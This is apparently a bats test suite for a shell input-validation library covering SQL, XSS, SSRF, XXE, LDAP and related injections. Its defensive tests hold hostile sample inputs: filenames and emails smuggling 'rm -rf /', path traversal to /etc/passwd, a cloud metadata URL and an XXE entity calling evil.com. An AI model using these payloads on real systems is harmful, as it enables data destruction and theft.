#!/usr/bin/env bats
# Test suite for lib/security/input-validation.sh
# TDD: Tests written BEFORE implementation

setup() {
    # Source the library
    source "${BATS_TEST_DIRNAME}/../../lib/security/input-validation.sh"
}

# SQL Injection Prevention Tests
@test "sanitize_sql_input should escape single quotes" {
    result=$(sanitize_sql_input "O'Reilly")
    [ "$result" = "O''Reilly" ]
}

@test "sanitize_sql_input should remove DROP keyword" {
    result=$(sanitize_sql_input "DROP TABLE users")
    [[ ! "$result" =~ DROP ]]
}

@test "sanitize_sql_input should handle empty input" {
    result=$(sanitize_sql_input "")
    [ -z "$result" ]
}

@test "sanitize_sql_input should escape semicolons" {
    result=$(sanitize_sql_input "SELECT * FROM users; DROP TABLE users")
    [[ "$result" =~ "\\;" ]]
}

# XSS Prevention Tests
@test "sanitize_html_output should encode HTML entities" {
    result=$(sanitize_html_output "<script>alert('XSS')</script>")
    [ "$result" = "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;" ]
}

@test "sanitize_html_output should encode ampersands" {
    result=$(sanitize_html_output "Tom & Jerry")
    [ "$result" = "Tom &amp; Jerry" ]
}

# Filename Validation Tests
@test "validate_filename should reject path traversal" {
    run validate_filename "../etc/passwd"
    [ "$status" -eq 2 ]
}

@test "validate_filename should reject shell metacharacters" {
    run validate_filename "file;rm -rf /"
    [ "$status" -eq 3 ]
}

@test "validate_filename should reject null bytes" {
    run validate_filename $'file\x00.txt'
    [ "$status" -eq 4 ]
}

@test "validate_filename should reject Windows reserved names" {
    run validate_filename "CON.txt"
    [ "$status" -eq 5 ]
}

@test "validate_filename should reject overly long names" {
    long_name=$(printf 'a%.0s' {1..300})
    run validate_filename "$long_name"
    [ "$status" -eq 6 ]
}

@test "validate_filename should accept valid filenames" {
    run validate_filename "valid-file_name.txt"
    [ "$status" -eq 0 ]
}

# Email Validation Tests
@test "validate_email should accept valid emails" {
    run validate_email "user@example.com"
    [ "$status" -eq 0 ]
}

@test "validate_email should reject invalid format" {
    run validate_email "not-an-email"
    [ "$status" -eq 2 ]
}

@test "validate_email should reject dangerous characters" {
    run validate_email "user;rm -rf /@example.com"
    [ "$status" -eq 3 ]
}

@test "validate_email should reject multiple @ symbols" {
    run validate_email "user@@example.com"
    [ "$status" -eq 4 ]
}

# URL Validation Tests (SSRF Prevention)
@test "validate_external_url should accept valid HTTPS URLs" {
    run validate_external_url "https://example.com/path"
    [ "$status" -eq 0 ]
}

@test "validate_external_url should reject localhost" {
    run validate_external_url "http://localhost/admin"
    [ "$status" -eq 3 ]
}

@test "validate_external_url should reject private IPs" {
    run validate_external_url "http://192.168.1.1/internal"
    [ "$status" -eq 4 ]
}

@test "validate_external_url should reject metadata endpoints" {
    run validate_external_url "http://169.254.169.254/latest/meta-data"
    [ "$status" -eq 5 ]
}

@test "validate_external_url should reject invalid protocols" {
    run validate_external_url "file:///etc/passwd"
    [ "$status" -eq 2 ]
}

# JSON Validation Tests
@test "validate_json_input should reject prototype pollution" {
    run validate_json_input '{"__proto__": {"isAdmin": true}}'
    [ "$status" -eq 2 ]
}

@test "validate_json_input should accept valid JSON" {
    run validate_json_input '{"name": "test", "value": 123}'
    [ "$status" -eq 0 ]
}

@test "validate_json_input should reject invalid JSON syntax" {
    skip "Requires jq to be installed"
    run validate_json_input '{"broken": '
    [ "$status" -eq 3 ]
}

# Integer Validation Tests
@test "validate_integer should accept valid integers" {
    run validate_integer "12345"
    [ "$status" -eq 0 ]
}

@test "validate_integer should accept negative integers" {
    run validate_integer "-12345"
    [ "$status" -eq 0 ]
}

@test "validate_integer should reject non-integers" {
    run validate_integer "12.34"
    [ "$status" -eq 2 ]
}

@test "validate_integer should detect overflow" {
    run validate_integer "99999999999999999999999999999"
    [ "$status" -eq 3 ]
}

# Unicode Normalization Tests
@test "normalize_unicode should remove RTL override characters" {
    # RTL override: U+202E
    input=$'Hello\u202Eworld'
    result=$(normalize_unicode "$input")
    [[ ! "$result" =~ $'\u202E' ]]
}

@test "normalize_unicode should convert homoglyphs" {
    # Cyrillic 'a' looks like Latin 'a'
    input="раssword"  # First 'a' is Cyrillic
    result=$(normalize_unicode "$input")
    [ "$result" = "password" ]
}

# Template Injection Prevention Tests
@test "sanitize_template_input should escape double curly braces" {
    result=$(sanitize_template_input "{{7*7}}")
    [ "$result" = "\\{\\{7*7\\}\\}" ]
}

@test "sanitize_template_input should escape template expressions" {
    result=$(sanitize_template_input "\${user.admin}")
    [ "$result" = "\\\${user.admin}" ]
}

# Regex Safety Tests
@test "validate_regex_safety should detect catastrophic backtracking" {
    run validate_regex_safety "(.*)*"
    [ "$status" -eq 2 ]
}

@test "validate_regex_safety should accept safe regex" {
    run validate_regex_safety "^[a-z]+@[a-z]+\.[a-z]+$"
    [ "$status" -eq 0 ]
}

# XML Safety Tests
@test "parse_xml_safely should reject DOCTYPE declarations" {
    run parse_xml_safely '<!DOCTYPE foo SYSTEM "file:///etc/passwd">'
    [ "$status" -eq 2 ]
}

@test "parse_xml_safely should reject ENTITY declarations" {
    run parse_xml_safely '<!ENTITY xxe SYSTEM "http://evil.com/steal">'
    [ "$status" -eq 2 ]
}

@test "parse_xml_safely should accept safe XML" {
    run parse_xml_safely '<user><name>John</name></user>'
    [ "$status" -eq 0 ]
}

# LDAP Injection Prevention Tests
@test "sanitize_ldap_input should escape LDAP metacharacters" {
    result=$(sanitize_ldap_input "cn=admin*")
    [ "$result" = "cn=admin\\*" ]
}

@test "sanitize_ldap_input should escape parentheses" {
    result=$(sanitize_ldap_input "(admin)")
    [ "$result" = "\\(admin\\)" ]
}

# Input Length Validation Tests
@test "validate_input_length should accept valid length" {
    run validate_input_length "short text" 100
    [ "$status" -eq 0 ]
}

@test "validate_input_length should reject excessive length" {
    long_input=$(printf 'a%.0s' {1..200})
    run validate_input_length "$long_input" 100
    [ "$status" -eq 1 ]
}